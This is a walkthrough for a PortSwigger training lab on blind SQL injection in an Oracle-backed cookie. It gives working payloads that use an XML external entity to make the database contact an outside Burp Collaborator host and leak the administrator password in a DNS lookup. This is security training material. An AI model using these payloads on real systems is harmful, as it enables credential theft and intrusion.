# Blind SQL Injection with Out-of-Band Data Exfiltration - [Link](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)

**Goal**: Exploit a **blind SQL injection** vulnerability to **extract the administrator's password** using **out-of-band (OAST)** techniques.

This lab contains a blind SQL injection vulnerability in the `TrackingId` cookie. The SQL query runs **asynchronously**, which means the server doesn't show any visible sign of success or failure. Instead of using error-based or time-based techniques, we can **exfiltrate data** by triggering **DNS requests** to a domain we control (Burp Collaborator domain).


### Steps:

1. **Open Burp Suite Professional** and go to the **Burp Collaborator** tab.
2. Copy your unique Collaborator domain.
   For this lab, one of the provided domains was:

   ```
   918zwk36zaccx0fpbm2givebp2vtjk79.oastify.com
   ```
3. Visit the lab in your browser with Burp running.
4. Look for the `TrackingId` cookie in any request and inject the following **test payload** (Oracle DB specific):

   ```sql
   ' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://918zwk36zaccx0fpbm2givebp2vtjk79.oastify.com/"> %remote;]>'),'/l') FROM dual)
   ```
5. Send the request and check **Burp Collaborator** for a DNS interaction.
6. Once confirmed, replace the static domain with a **dynamic one** containing the actual password:

   ```sql
   ' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.918zwk36zaccx0fpbm2givebp2vtjk79.oastify.com/"> %remote;]>'),'/l') FROM dual)--
   ```
7. Send the request and **poll Collaborator** again.
8. You’ll receive a **DNS request** containing the password of the administrator.
   Example:

   ```
   The Collaborator server received a DNS lookup of type AAAA for:
   zpwt6c28dims3nb0jily.918zwk36zaccx0fpbm2givebp2vtjk79.oastify.com
   ```

   So, the **password is**:

   ```
   zpwt6c28dims3nb0jily
   ```
9. Go to the login page and log in as `administrator` using that password.


✅ **Lab Solved**
